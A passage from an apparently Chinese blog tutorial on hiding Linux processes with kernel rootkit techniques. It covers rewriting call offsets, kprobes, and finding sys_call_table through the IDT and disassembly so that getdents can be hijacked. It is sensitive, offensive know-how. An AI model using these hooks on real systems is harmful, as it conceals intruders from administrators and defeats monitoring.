kallsyms_lookup_name(&quot;proc_pid_readdir&quot;);  //劫持函数地址</span><br></pre></td></tr></table></figure><p><code>call rel32</code>指令占5个字节，第一个字节是<code>0xe8</code>，然后我这<code>fun</code>是个指针是4个字节长度，那么在上层函数中找到<code>call</code>指令的地址的方式就是一个循环遍历，循环次数自定义。</p><blockquote><p>与运算是为了排除字节填充的干扰，只判断低位的一个字节。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsigned int i=0;</span><br><span class="line">while(1)&#123;</span><br><span class="line">  if(i&gt;512)&#123;return 0;&#125;</span><br><span class="line">  if((fun[0]&amp;0x000000ff)==0xe8)&#123;</span><br><span class="line">        //TODO</span><br><span class="line">  &#125;</span><br><span class="line">  fun++;</span><br><span class="line">  i++;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当搜寻到<code>call</code>指令后就要看一下调用的<code>offset</code>算出来的地址是不是要劫持的函数地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原地址=当前地址+offset+5</span><br></pre></td></tr></table></figure><p>对应的代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_func_addr = (int)fun+origin_offset+5;</span><br><span class="line">if(call_func_addr == origin)&#123;printk(&quot;[addr]origin=%lx\n&quot;,call_func_addr);break;&#125;</span><br></pre></td></tr></table></figure><p>这时候就能确定当前地址就是我们需要的，只需要修改<code>call</code>后面的<code>offset</code>就行，与<code>jmp</code>不同的是<code>call</code>需要填充后面四个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hook_offset = (unsigned long)new - (unsigned long)fun-5;</span><br><span class="line">fun[1]=(hook_offset&amp;0x000000ff);</span><br><span class="line">fun[2]=(hook_offset&amp;0x0000ff00) &gt;&gt; 8;</span><br><span class="line">fun[3]=(hook_offset&amp;0x00ff0000) &gt;&gt; 16;</span><br><span class="line">fun[4]=(hook_offset&amp;0xff000000) &gt;&gt; 24;</span><br></pre></td></tr></table></figure><p>就此上层函数在执行时候就会调用我们编写的函数，要修改回来的话就是把保存的原来的offset重新覆盖进去就行。</p><h3 id="kprobe劫持"><a href="#kprobe劫持" class="headerlink" title="kprobe劫持"></a>kprobe劫持</h3><blockquote><p>这个是存在劫持的方式的，但是我没有做出来</p></blockquote><p><code>kprobe</code>的劫持的方式个人觉得就是修改寄存器中的值，比如<code>handler_pre</code>函数的第二个参数<code>*regs</code>这是保存的触发断点前的寄存器状态，可以通过修改此时寄存器中的值来做到劫持，不过我并没有实现，因为个人感觉代价有点大。 但是还是做个简单的使用。<code>kprobe</code>有自己的一套代码格式，而且怎么说呢，这个开发的目的还是属于<code>内核探针/监控</code>一类，而非<code>劫持</code>，因此不打算深入去做。 先把框架搭好，找到要下断点的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int register_kprobe(struct kprobe *kp);</span><br><span class="line">static struct kprobe kp =&#123;</span><br><span class="line"> .symbol_name = &quot;proc_pid_readdir&quot;, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后定义每次到断点时候执行的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int handler_pre(struct kprobe *p,struct pt_regs *reg)&#123;</span><br><span class="line"> printk(&quot;proc_pid_readdir hook\n&quot;);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line">kp.pre_handler = handler_pre;</span><br></pre></td></tr></table></figure><p>最后注册起来就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int ret;</span><br><span class="line">ret = register_kprobe(&amp;kp);</span><br></pre></td></tr></table></figure><p>这样每次执行<code>proc_pid_readdir</code>之前都会现在内核中打印<code>proc_pid_readdir hook</code>。如果此时调试的话，实际可以看到<code>proc_pid_readdir</code>的函数地址是没有变的，变的是函数开头的指令，变成了<code>0xcc</code>。</p><blockquote><p>对于2.6的内核版本可以尝试劫持成功，因为和VFS劫持一样，<code>filldir</code>是作为参数传入的，因此在寄存器中替换掉就可以做到劫持。</p></blockquote><h3 id="劫持系统调用"><a href="#劫持系统调用" class="headerlink" title="劫持系统调用"></a>劫持系统调用</h3><p><code>用户态</code>下我们想到的是劫持C库的<code>readdir</code>函数，但是这样只要通过新的<code>ps</code>就可以破解，那<code>内核态</code>下自然是更底层的直接劫持相关的<code>系统调用</code>，把让<code>系统调用</code>不返回我们要隐藏的进程信息即可。</p><blockquote><p>linux下读取目录信息的系统调用有<code>getdents</code>，<code>getdents64</code>，<code>readdir</code></p></blockquote><p>攻击方式：动态修改<code>系统调用表</code>劫持系统调用，过滤特定的信息。 系统调用是内核开放给用户态的一层<code>api</code>，这些<code>api</code>封装了一些内核函数，而用户态下通过调用<code>api</code>从而实现了内核函数的调用。</p><blockquote><p>可以从<code>unistd.h</code>中看到当前内核定义好的<code>系统调用号</code></p></blockquote><p>首先找到<code>ps</code>命令中需要劫持的那个<code>系统调用</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -c ps</span><br></pre></td></tr></table></figure><p>进程在<code>/proc</code>下是一个个目录文件，而<code>ps</code>中读取目录文件的系统调用出现了<code>getdents</code>，因此这就是我们要劫持的系统调用。按照默认，此系统调用的系统调用号为<code>__NR_getdents</code>, 可以接着通过<code>unistd.h</code>找到系统调用号对应的函数入口<code>sys_getdents</code>，但是也不用想的那么深入，因为在<code>系统调用表中</code>，<code>__NR_SYSCALL</code>就是数组的<code>key</code>，只需要替换掉数组的值就能替换系统调用。而并不用太深入的追究<code>sys_getdents</code>是怎么实现的。</p><p>思路就很简单了:</p><ol><li>找到系统调用表</li><li>替换<code>__NR_getdents</code>值为重写调用的地址</li><li>重写调用判断是否需要隐藏进程，然后调用原系统调用</li></ol><p>但是问题就来了，在<code>2.6</code>以后<code>sys_call_table</code>不再被导出了，因此如何找到系统调用表就成了一个问题。先前说过，在执行系统调用的过程中，有一个步骤就是调用了一个软中断，即<code>int 0x80</code>从而陷入内核态，此刻有一个疑问，怎么调用的<code>int 0x80</code>？</p><blockquote><p>在<code>intel x86</code>中，中断指令是<code>int</code>，这个指令会将<code>cs</code>中的<code>CPL(当前进程特权级)</code>置为0。</p></blockquote><p>系统的启动会进入到一个<code>保护模式</code>下的初始化，即<code>go_to_protected_mode</code>，其中调用了一个<code>setup_idt()</code>，这会建立一个空<code>中断向量表</code>，之后调用<code>trap_init()</code>会开始初始化<code>向量表</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static void setup_idt(void)</span><br><span class="line">&#123;</span><br><span class="line"> static const struct gdt_ptr null_idt = &#123;0, 0&#125;;</span><br><span class="line"> asm volatile(&quot;lidtl %0&quot; : : &quot;m&quot; (null_idt));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>system_call</code>中有部分是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call _sys_call_table(,%eax,4)</span><br></pre></td></tr></table></figure><p>这就是<code>系统调用表</code>的地址，那流程也就清楚了，<code>系统调用表</code>可以从<code>system_call</code>中获取，<code>system_call</code>在<code>0x80中断向量表述符</code>中，而<code>0x80中断向量描述符</code>可以通过<code>IDT</code>偏移获取，而<code>IDT</code>基地址则是通过<code>IDTR</code>寄存器来确定的。</p><blockquote><p>指令<code>lidt</code>和<code>sidt</code>分别用于加载和保存<code>IDTR</code>寄存器的内容</p></blockquote><p>反汇编一下<code>system_call</code>大致看一下情况(我反汇编的是32位的老内核，所以仅供参考，内核代码都不同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble /m system_call</span><br></pre></td></tr></table></figure><p>有如下结果出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">528 syscall_call:</span><br><span class="line">529 call *sys_call_table(,%eax,4)</span><br><span class="line">   0xc1002a5e &lt;+62&gt;: call DWORD PTR [eax*4-0x3ebaaee8]</span><br></pre></td></tr></table></figure><p>再单行查看内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤ x 0xc1002a5e</span><br><span class="line">0xc1002a5e &lt;system_call+62&gt;: 0x89c14551188514ff</span><br></pre></td></tr></table></figure><p>这儿的指令实际上是<code>call DWORD PTR</code>，也就是<code>\xff\x14\x85</code>，源码内容可以在<code>/arch/x86/kernel/entry_64.S</code>下看到(这个找的<code>v3.15</code>版本的)</p><blockquote><p>先前的研究说<code>call</code>是<code>0xe8</code>5字节，然后并不够严谨，因此在这踩了坑，这部分资料参考资料里有</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">system_call_fastpath:</span><br><span class="line">#if __SYSCALL_MASK == ~0</span><br><span class="line"> cmpq $__NR_syscall_max,%rax</span><br><span class="line">#else</span><br><span class="line"> andl $__SYSCALL_MASK,%eax</span><br><span class="line"> cmpl $__NR_syscall_max,%eax</span><br><span class="line">#endif</span><br><span class="line"> ja badsys</span><br><span class="line"> movq %r10,%rcx</span><br><span class="line"> call *sys_call_table(,%rax,8) # XXX: rip relative</span><br><span class="line"> movq %rax,RAX-ARGOFFSET(%rsp)</span><br></pre></td></tr></table></figure><p>但是！这个文件从<code>v4.2-rc1</code>以后就没有了，这就使得我根本找不到这个函数。逼得我不得不去找代码，但是找来找去，直接在汇编中引用了<code>sys_call_table</code>的只有<code>/arch/x86/entry/entry_64.S</code>中的<code>entry_SYSCALL_64</code></p><blockquote><p>这实际是另一种系统调用的实现，后文提及</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">......</span><br><span class="line">entry_SYSCALL_64_fastpath:</span><br><span class="line">/*</span><br><span class="line"> * Easy case: enable interrupts and issue the syscall.  If the syscall</span><br><span class="line"> * needs pt_regs, we&#x27;ll call a stub that disables interrupts again</span><br><span class="line"> * and jumps to the slow path.</span><br><span class="line"> */</span><br><span class="line">TRACE_IRQS_ON</span><br><span class="line">ENABLE_INTERRUPTS(CLBR_NONE)</span><br><span class="line">#if __SYSCALL_MASK == ~0</span><br><span class="line">cmpq$__NR_syscall_max, %rax</span><br><span class="line">#else</span><br><span class="line">andl$__SYSCALL_MASK, %eax</span><br><span class="line">cmpl$__NR_syscall_max, %eax</span><br><span class="line">#endif</span><br><span class="line">ja1f/* return -ENOSYS (already in pt_regs-&gt;ax) */</span><br><span class="line">movq%r10, %rcx</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * This call instruction is handled specially in stub_ptregs_64.</span><br><span class="line"> * It might end up jumping to the slow path.  If it jumps, RAX</span><br><span class="line"> * and all argument registers are clobbered.</span><br><span class="line"> */</span><br><span class="line">#ifdef CONFIG_RETPOLINE</span><br><span class="line">movqsys_call_table(, %rax, 8), %rax</span><br><span class="line">call__x86_indirect_thunk_rax</span><br><span class="line">#else</span><br><span class="line">call*sys_call_table(, %rax, 8)</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>浏览一遍后发现还不是直接<code>call</code>的，这儿出现了一个判断，就是如果没有<code>CONFIG_RETPOLINE</code>那自然是直接进入到<code>call *sys_call_table(, %rax, 8)</code>然后调用对应的例程，但是如果有呢则先加载数据到<code>mmx寄存器</code>让然后调用<code>__x86_indirect_thunk_rax</code>。 这儿的<code>CONFIG_RETPOLINE</code>是一个叫做<code>retpoline</code>的解决方案是为了应对<code>intel CPU</code>的<code>Spectre</code>问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /sys/devices/system/cpu/vulnerabilities/spectre_v2</span><br><span class="line">Mitigation: Full generic retpoline, IBPB, IBRS_FW</span><br></pre></td></tr></table></figure><blockquote><p>查找<code>Full generic retpoline</code>，查看自己的系统有没有这个配置</p></blockquote><p>我的内核版本是有的，说明系统调用是不会直接进入到<code>call *sys_call_table(, %rax, 8)</code>中的，编译内核后<code>gdb</code>反编译下看看内存状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤ disassemble /m entry_SYSCALL_64</span><br><span class="line">......</span><br><span class="line">   0xffffffff81a00060 &lt;+80&gt;: ja 0xffffffff81a00077 &lt;entry_SYSCALL_64+103&gt;</span><br><span class="line">   0xffffffff81a00062 &lt;+82&gt;: mov rcx,r10</span><br><span class="line">   0xffffffff81a00065 &lt;+85&gt;: mov rax,QWORD PTR [rax*8-0x7e1ffee0]</span><br><span class="line">   0xffffffff81a0006d &lt;+93&gt;: call 0xffffffff81c03000 &lt;__x86_indirect_thunk_rax&gt;</span><br><span class="line">   0xffffffff81a00072 &lt;+98&gt;: mov QWORD PTR [rsp+0x50],rax</span><br><span class="line">   0xffffffff81a00077 &lt;+103&gt;: cli    </span><br><span class="line">   0xffffffff81a00078 &lt;+104&gt;: mov r11,QWORD PTR gs:0x14d00</span><br><span class="line">   0xffffffff81a00081 &lt;+113&gt;: test DWORD PTR [r11],0x900838df</span><br></pre></td></tr></table></figure><p><code>call</code>了<code>__x86_indirect_thunk_rax</code>，后面的<code>call *sys_call_table(, %rax, 8)</code>没有了，而前面有个<code>movq sys_call_table(, %rax, 8), %rax</code>还是能拿到<code>sys_call_table</code>的地址的。 用<code>objdump</code>反汇编一下看一下具体的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">sudo objdump -d vmlinux --start-address=0xffffffff81a00010 --stop-address=0xffffffff81a001c7</span><br><span class="line">ffffffff81a00059 &lt;entry_SYSCALL_64_fastpath&gt;:</span><br><span class="line">ffffffff81a00059: fb sti    </span><br><span class="line">ffffffff81a0005a: 48 3d 4c 01 00 00 cmp $0x14c,%rax</span><br><span class="line">ffffffff81a00060: 77 15 ja ffffffff81a00077 &lt;entry_SYSCALL_64_fastpath+0x1e&gt;</span><br><span class="line">ffffffff81a00062: 4c 89 d1 mov %r10,%rcx</span><br><span class="line">ffffffff81a00065: 48 8b 04 c5 20 01 e0 mov -0x7e1ffee0(,%rax,8),%rax</span><br><span class="line">ffffffff81a0006c: 81 </span><br><span class="line">ffffffff81a0006d: e8 8e 2f 20 00 callq ffffffff81c03000 &lt;__x86_indirect_thunk_rax&gt;</span><br><span class="line">ffffffff81a00072: 48 89 44 24 50 mov %rax,0x50(%rsp)</span><br><span class="line">ffffffff81a00077: fa cli    </span><br><span class="line">ffffffff81a00078: 65 4c 8b 1c 25 00 4d mov %gs:0x14d00,%r11</span><br><span class="line">ffffffff81a0007f: 01 00 </span><br><span class="line">ffffffff81a00081: 41 f7 03 df 38 08 90 testl $0x900838df,(%r11)</span><br><span class="line">ffffffff81a00088: 75 19 jne ffffffff81a000a3 &lt;entry_SYSCALL_64_fastpath+0x4a&gt;</span><br><span class="line">ffffffff81a0008a: 48 8b 8c 24 80 00 00 mov 0x80(%rsp),%rcx</span><br><span class="line">ffffffff81a00091: 00 </span><br><span class="line">ffffffff81a00092: 4c 8b 9c 24 90 00 00 mov 0x90(%rsp),%r11</span><br><span class="line">ffffffff81a00099: 00 </span><br><span class="line">ffffffff81a0009a: 48 83 c4 30 add $0x30,%rsp</span><br><span class="line">ffffffff81a0009e: e9 bc 00 00 00 jmpq ffffffff81a0015f &lt;syscall_return_via_sysret+0xa&gt;</span><br><span class="line">ffffffff81a000a3: fb sti    </span><br><span class="line">ffffffff81a000a4: 4c 89 3c 24 mov %r15,(%rsp)</span><br><span class="line">ffffffff81a000a8: 4c 89 74 24 08 mov %r14,0x8(%rsp)</span><br><span class="line">ffffffff81a000ad: 4c 89 6c 24 10 mov %r13,0x10(%rsp)</span><br><span class="line">ffffffff81a000b2: 4c 89 64 24 18 mov %r12,0x18(%rsp)</span><br><span class="line">ffffffff81a000b7: 48 89 6c 24 20 mov %rbp,0x20(%rsp)</span><br><span class="line">ffffffff81a000bc: 48 89 5c 24 28 mov %rbx,0x28(%rsp)</span><br><span class="line">ffffffff81a000c1: 48 89 e7 mov %rsp,%rdi</span><br><span class="line">ffffffff81a000c4: e8 77 19 60 ff callq ffffffff81001a40 &lt;syscall_return_slowpath&gt;</span><br><span class="line">ffffffff81a000c9: eb 25 jmp ffffffff81a000f0 &lt;return_from_SYSCALL_64&gt;</span><br></pre></td></tr></table></figure><p><code>0xffffffff81a00065</code>这个地址去<code>gdb</code>查内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤ x/2 0xffffffff81a00065</span><br><span class="line">0xffffffff81a00065 &lt;entry_SYSCALL_64+85&gt;: 0xc5048b48 0x81e00120</span><br></pre></td></tr></table></figure><p>补全的话实际<code>0xffffffff81e00120</code>就是<code>sys_call_table</code>的地址。那么是不是可以针对<code>entry_SYSCALL_64</code>进行汇编码的暴力搜索，从而找出地址来，和以前的方法一样，只不过换了判断而已。</p><blockquote><p>此时完全没有想到我的思路已经走远了！！因为此时的我还不知道三种系统调用</p></blockquote><p>去看<code>idt_table</code>的获取。</p><blockquote><p>通过<code>idtr.base</code>获取，在<code>保护模式</code>下，这叫做<code>中断描述符表</code>，而在<code>实模式</code>下称为<code>中断向量表</code>，这是因为在<code>实模式</code>下<code>idtr.base</code>指向的表格项目直接给出<code>中断服务例程</code>的入口地址，而在<code>保护模式</code>下给的是<code>门描述符</code>，从<code>门描述符</code>间接才能取到<code>服务例程</code>入口地址。<code>实模式</code>很短，当<code>CPU复位(reset)</code>或者是<code>加电(power on)</code>时是<code>实模式</code>。</p></blockquote><p>直接通过<code>sidt</code>保存<code>idtr寄存器</code>的信息，其结构体也非常简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static struct _idtr</span><br><span class="line">&#123;</span><br><span class="line">        unsigned short limit;   //32位是0xff，64位是0xfff</span><br><span class="line">        unsigned long base;</span><br><span class="line">&#125;__attribute__ ((packed));</span><br></pre></td></tr></table></figure><blockquote><p>我最后才发现这儿<code>limit</code>在64位下的大小问题，太大意了。 <a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3a085e75-9abf-4bdc-8eb0-fc2ca3ccf3c5.jpeg"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3a085e75-9abf-4bdc-8eb0-fc2ca3ccf3c5.jpeg" alt="3a085e75-9abf-4bdc-8eb0-fc2ca3ccf3c5.jpeg"></a></p></blockquote><ul><li>代码获取的<code>idt_table</code>地址：<code>0xfffffe0000000000</code></li><li>通过<code>内核符号表</code>获取到的<code>idt_table</code>地址：<code>0xffffffff8a4e4000</code></li></ul><p>取<code>idt_table</code>地址出现了上述的情况，后来查阅了资料和代码发现是正常机制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void __init trap_init(void)</span><br><span class="line">&#123;</span><br><span class="line"> /* Init cpu_entry_area before IST entries are set up */</span><br><span class="line"> setup_cpu_entry_areas();</span><br><span class="line"></span><br><span class="line"> idt_setup_traps();</span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line">  * Set the IDT descriptor to a fixed read-only location, so that the</span><br><span class="line">  * &quot;sidt&quot; instruction will not leak the location of the kernel, and</span><br><span class="line">  * to defend the IDT against arbitrary memory write vulnerabilities.</span><br><span class="line">  * It will be reloaded in cpu_init() */</span><br><span class="line"> cea_set_pte(CPU_ENTRY_AREA_RO_IDT_VADDR, __pa_symbol(idt_table),</span><br><span class="line">      PAGE_KERNEL_RO);</span><br><span class="line"> idt_descr.address = CPU_ENTRY_AREA_RO_IDT;</span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line">  * Should be a barrier for any external CPU state:</span><br><span class="line">  */</span><br><span class="line"> cpu_init();</span><br><span class="line"></span><br><span class="line"> idt_setup_ist_traps();</span><br><span class="line"></span><br><span class="line"> x86_init.irqs.trap_init();</span><br><span class="line"></span><br><span class="line"> idt_setup_debugidt_traps();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这儿的代码注释就说的很明显了，最后重载的地址是<code>CPU_ENTRY_AREA_RO_IDT</code>也是<code>只读线性地址</code>，而这个地址是<code>idt_table</code>映射来的最后通过<code>cpu_init()</code>重载。 去跟<code>idt_table</code>的结构体会发现是<code>gate_struct</code>，不再是资料上的<code>idt</code>了。</p><blockquote><p>提取基地址中的<code>low</code>+<code>middle</code>+<code>high</code>共同组成了一个<code>divide_error</code>，也就是0号地址。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct _gate_struct &#123;</span><br><span class="line"> u16 offset_low;</span><br><span class="line"> u16 segment;</span><br><span class="line"> struct idt_bits bits;</span><br><span class="line"> u16 offset_middle;</span><br><span class="line">#ifdef CONFIG_X86_64</span><br><span class="line"> u32 offset_high;</span><br><span class="line"> u32 reserved;</span><br><span class="line">#endif</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>再向后看一个函数，就很有意思了，也就是针对<code>gate_desc</code>的处理</p><blockquote><p>typedef struct gate_struct gate_desc;</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static inline unsigned long gate_offset(const gate_desc *g)</span><br><span class="line">&#123;</span><br><span class="line">#ifdef CONFIG_X86_64</span><br><span class="line"> return g-&gt;offset_low | ((unsigned long)g-&gt;offset_middle &lt;&lt; 16) |</span><br><span class="line">  ((unsigned long) g-&gt;offset_high &lt;&lt; 32);</span><br><span class="line">#else</span><br><span class="line"> return g-&gt;offset_low | ((unsigned long)g-&gt;offset_middle &lt;&lt; 16);</span><br><span class="line">#endif</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的意思就是说一个<code>中断例程函数</code>比如<code>系统调用</code>的地址是通过<code>g-&gt;offset_low | ((unsigned long)g-&gt;offset_middle &lt;&lt; 16) | ((unsigned long) g-&gt;offset_high &lt;&lt; 32)</code>计算出来的。 <code>系统调用例程</code>的<code>中断号</code>是<code>128</code>也就是<code>0x80</code>，这样就可以通过<code>idtr.base</code>也就是<code>idt_table</code>基地址来获取到我们需要的那一个<code>门描述符</code>地址，即<code>idt_table+16*0x80</code></p><blockquote><p>在<code>x86_64</code>中一个<code>idt</code>是<code>16</code>字节，因此这儿特别注意，不能照抄<code>8*0x80</code>!!!!这儿我一开始照抄完全定位不到想要的函数，排查了很久。推荐文章<a href="https://www.binss.me/blog/interrupt-and-exception/">中断和异常</a></p></blockquote><p>然而获取的地址却和我想的不同，通过计算获得的地址对应的<code>内核符号</code>是<code>entry_INT80_compat</code>而非<code>entry_SYSCALL_64</code>，源码在<code>/arch/x86/entry/entry_64_compat.S</code>。其中<code>call</code>了一个函数如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* Handles int $0x80 */</span><br><span class="line">__visible void do_int80_syscall_32(struct pt_regs *regs)</span><br><span class="line">&#123;</span><br><span class="line"> enter_from_user_mode();</span><br><span class="line"> local_irq_enable();</span><br><span class="line"> do_syscall_32_irqs_on(regs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释就应该知道这个函数是<code>int 0x80</code>的函数。看名字的话<code>enter_from_user_mode</code>是将进程陷入<code>内核态</code>，<code>IRQ</code>是<code>中断请求(Interrupt Request)</code>，那<code>local_irq_enable()</code>就应该是针对<code>请求</code>的<code>放行</code>之类的处理，最后就看<code>do_syscall_32_irqs_on</code>，到这就完全卡住了，因为逻辑不对啊，怎么是<code>32</code>位的方式？</p><blockquote><p><a href="https://www.binss.me/blog/the-analysis-of-linux-system-call/">Linux系统调用过程分析</a>这篇文章，讲的特别好而且清楚，而且其中的历史解开了我很多在看源码时产生的疑惑，比如多种系统调用的方式。</p></blockquote><p>查阅了资料知道了三种<code>系统调用</code>，<code>64</code>位的系统下系统调用方式都被统一成<code>syscall</code>了而不是传统的<code>int 0x80</code>，不然在<code>do_syscall_32_irqs_on</code>就通过<code>32位的系统调用表</code>把流程走完了，也就是<code> regs-&gt;ax = ia32_sys_call_table[nr]</code>，这样是拿不到<code>64</code>位的表的。</p><blockquote><p>这点有历史原因，参照上面的文章，大概就是在某个时期<code>Intel</code>和<code>AMD</code>分开创建了新的<code>系统调用指令</code>分别是<code>sysenter</code>和<code>syscall</code>，解决了<code>软中断</code>进行<code>系统调用</code>太慢的问题，然而在<code>64</code>位上<code>intel</code>却发现<code>x86</code>架构的程序不能用了，只能也跟着用起了<code>syscall</code></p></blockquote><p>而通过<code>idt</code>获取到的<code>entry_INT80_compat</code>官方给出的解释是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry_INT80_compat: int 0x80 from 32-bit or 64-bit code; compat syscall either way.</span><br></pre></td></tr></table></figure><p>同样在<code>entry_32.S</code>中也能找到注解</p><figure 